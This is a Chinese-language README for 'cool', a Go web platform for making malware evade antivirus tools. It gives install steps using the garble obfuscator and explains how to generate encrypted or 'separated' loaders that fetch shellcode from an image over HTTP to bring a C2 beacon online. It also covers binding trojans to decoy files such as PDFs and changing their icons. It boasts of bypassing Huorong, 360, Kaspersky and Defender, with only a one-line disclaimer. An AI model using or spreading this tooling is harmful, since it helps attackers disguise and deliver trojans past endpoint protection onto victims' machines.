# cool
时间线：
- Golang Gin 框架写的免杀平台- (2021.11.12)
- Golang Gin 框架写的免杀平台，更新捆绑免杀- (2021.11.20)
- 增加自定义捆绑，修复一个小bug- (2021.11.22)
- 上传"compile.exe_备份"，在\service\executable\下，如果出现0kb的话就把原来的compile.exe删掉，把"compile.exe_备份"改成compile.exe，这样的话混淆效果会变差。。。但是至少能用了-（2021.11.25）
## 安装
1. 安装Go环境，版本要**1.17**及以上；
2. 如果是首次安装Go环境，安装完毕后要配置代理，执行以下这两条命令:
 -  **go env -w GO111MODULE=on** 
 -  **go env -w GOPROXY=https://goproxy.io,direct** 
3. 完毕后执行 **go install mvdan.cc/garble@latest** ；
4. 下载本项目到D盘根目录，文件夹名字改为cool；
5. 运行cool.exe；
6. 访问 **http://127.0.0.1:9000** 。

## 使用
为减去浏览器扫描的时间，故生成的文件格式为txt，使用时只需要把后缀修改为前端提示的后缀就可以了。
### 1. 加密1
- 直接执行exe。
### 2. 加密2
- 直接执行exe。
### 3. 分离1(houqing) 
- 用python起一个HTTP服务(python -m http.server 8080)，
- 把图片放到起http服务的目录下，
- 执行exe 参数为http服务的图片路径（xxx.exe http://127.0.0.1:8080/a.jpg) 。
### 4. 分离2
#### 上线方式1
- 用python起一个HTTP服务(python -m http.server 8080)，
- 把图片放到起http服务的目录下，
- 执行exe 参数为http服务的图片路径（xxx.exe http://127.0.0.1:8080/a.jpg) 。
#### 上线方式2
- 执行xxx.exe 参数为shellcode.txt里的内容 。
### 5. 捆绑上线
#### 捆绑内置免杀马
- 填写信息(免杀方式、listeners或者shellcode等)，
- 上传需要和木马捆绑的文件，
- 下载完毕后将后缀改为exe，
- 图标自行修改。
#### 捆绑自定义木马
- 第一个文件选择木马(木马.exe)，第二个文件选择要捆绑的文件(如pdf等)
- 点击生成

目前火绒、360、卡巴斯基、def全过；先这样用，不能bypass了再说，更新频率看star数量🐕。

## 声明：仅用于技术交流，请勿用于非法用途。
